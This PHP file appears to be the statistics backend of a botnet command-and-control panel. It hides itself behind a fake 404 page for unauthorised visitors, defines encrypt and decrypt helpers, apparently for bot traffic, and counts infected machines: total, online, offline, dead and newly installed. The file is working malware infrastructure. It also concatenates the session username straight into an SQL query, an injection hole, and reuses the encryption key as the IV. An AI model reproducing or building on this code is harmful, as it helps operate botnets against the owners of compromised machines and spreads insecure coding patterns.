<?php

include("db.php");


session_start();
$username = $_SESSION['username'];
if(!isset($_SESSION['username']) || empty($_SESSION['username'])){
	header("HTTP/1.1 404 Not Found");
	include_once("404.php");
	die();

}
// Get User Perms
$odb = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
$userperms = $odb->query("SELECT type FROM users WHERE username = '".$username."'")->fetchColumn(0);
// Check User Perms
if($userperms == "guest"){
	header("HTTP/1.1 404 Not Found");
	include_once("../404.php");
	die();

}




function encrypt($key, $stre)
{
	$rtn = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $stre, MCRYPT_MODE_CBC, $key);
	return base64_encode($rtn);
}

function decrypt($key, $strd)
{
	$strd = str_replace("~", "+", $strd);
	$rtn = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, base64_decode($strd), MCRYPT_MODE_CBC, $key);
	$rtn = rtrim($rtn, "\0\4");
	return $rtn;
}
function percent($num_amount, $num_total) {
$count1 = $num_amount / $num_total;
$count2 = $count1 * 100;
$count = number_format($count2, 0);
return $count;
}

$knock = $odb->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0) * 60;
$deadi = $odb->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0) * 86400;

$o_sql = $odb->prepare("SELECT COUNT(*) FROM bots WHERE lastresponse + :on > UNIX_TIMESTAMP()");
$o_sql->execute(array(":on" => $knock + 120));
$d_sql = $odb->prepare("SELECT COUNT(*) FROM bots WHERE lastresponse + :d < UNIX_TIMESTAMP()");
$d_sql->execute(array(":d" => $deadi));
$n_sql = $odb->prepare("SELECT COUNT(*) FROM bots WHERE installdate + :b > UNIX_TIMESTAMP()");
$n_sql->execute(array(":b" => "86400"));
$m_sql = $odb->prepare("SELECT COUNT(*) FROM bots WHERE installdate + :n > UNIX_TIMESTAMP()");
$m_sql->execute(array(":n" => "604800"));
$numtotal = $total = number_format($odb->query("SELECT COUNT(*) FROM bots")->fetchColumn(0));
$numonline = number_format($o_sql->fetchColumn(0));
$numoffline = $numtotal - $numonline;
$numdead = number_format($d_sql->fetchColumn(0));
$new24 = number_format($n_sql->fetchColumn(0));
$new7day = number_format($m_sql->fetchColumn(0));;
$onlineofflineratio = percent($numonline, $numtotal);
$onlineofflinefinal = $onlineofflineratio;


?>
